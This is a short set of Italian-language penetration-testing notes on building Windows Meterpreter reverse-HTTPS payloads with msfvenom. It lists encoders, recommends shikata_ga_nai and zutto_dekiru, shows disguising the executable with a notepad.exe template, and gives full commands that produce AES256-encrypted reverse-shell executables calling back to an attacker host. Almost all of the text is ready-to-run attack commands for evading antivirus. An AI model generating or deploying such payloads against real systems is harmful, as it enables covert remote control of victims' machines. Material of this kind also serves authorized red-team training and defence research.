### **ENCODERS**
Per listare gli encoders disponibili
```bash
msfvenom --list encoders
```
e per generare il payload
```bash
sudo msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e <ENCODER> -f exe -o <OUT PATH>
```
![[Pasted image 20230505171428.png]]
per 32 bit il miglior encoder è *shikata_ga_nai*
per 64 bit il miglior encoder è *zutto_dekiru*

Per cambiare template dell'exe puoi usare un differente executables con l'opzione *-x*
```bash
-x /home/kali/notepad.exe
```

### **ENCRYPTORS**
Meglio degli encoder
Per listare gli encryptors disponibili
```bash
msfvenom --list encrypt
```
Utilizzando il protocollo AES256 si genera un eseguibile con lo shellcode encryptato
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=4444 --encrypt aes256 --encrypt-key <CHIAVI CRIPTAZIONE> -f exe -o shell.exe
```
